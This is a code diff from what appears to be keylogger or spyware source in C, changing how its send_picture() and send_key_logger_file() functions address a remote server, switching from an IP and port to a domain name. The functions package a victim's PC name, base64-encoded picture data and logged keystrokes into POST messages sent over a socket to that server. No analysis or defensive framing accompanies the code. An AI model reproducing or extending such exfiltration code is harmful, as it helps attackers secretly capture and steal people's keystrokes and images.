@@ -223,11 +223,11 @@ int send_picture()
 
 
 
-	msg_len = strlen(POST_PICTURE_MSG) + strlen(pc_name) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + base_64_file_size + 10;
+	msg_len = strlen(POST_PICTURE_MSG) + strlen(pc_name) + strlen(DOMAIN_NAME) + base_64_file_size + 10;
 
 	msg = (char*)malloc(msg_len);
 
-	snprintf(msg, msg_len, POST_PICTURE_MSG, pc_name, base_64_file_size + strlen("{\"picture_content\":\"\"}") - 1, SOCKET_IP, SOCKET_PORT, APOSTROPHES, APOSTROPHES, APOSTROPHES);
+	snprintf(msg, msg_len, POST_PICTURE_MSG, pc_name, base_64_file_size + strlen("{\"picture_content\":\"\"}") - 1, DOMAIN_NAME, APOSTROPHES, APOSTROPHES, APOSTROPHES);
 
 	// the real / full msg len
 	msg_len = strlen(msg) + strlen("\"}") + base_64_file_size - 1; // without the null byte
@@ -381,12 +381,12 @@ int send_key_logger_file()
 	// Adding the null byte.
 	file_content[file_size] = '\0';
 
-	msg_len = strlen(POST_Key_Logger_MSG) + strlen(pc_name) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + sizeof(int) + file_size + 10;
+	msg_len = strlen(POST_Key_Logger_MSG) + strlen(pc_name) + strlen(DOMAIN_NAME) + sizeof(int) + file_size + 10;
 
 
 	msg = (char*)malloc(msg_len);
 
-	msg_len = snprintf(msg, msg_len, POST_Key_Logger_MSG, pc_name, file_size + strlen("{%key_logger%:%%}"), SOCKET_IP, SOCKET_PORT, APOSTROPHES, APOSTROPHES, APOSTROPHES, file_content, APOSTROPHES);
+	msg_len = snprintf(msg, msg_len, POST_Key_Logger_MSG, pc_name, file_size + strlen("{%key_logger%:%%}"), DOMAIN_NAME, APOSTROPHES, APOSTROPHES, APOSTROPHES, file_content, APOSTROPHES);
 
 
 	// start the socket connection
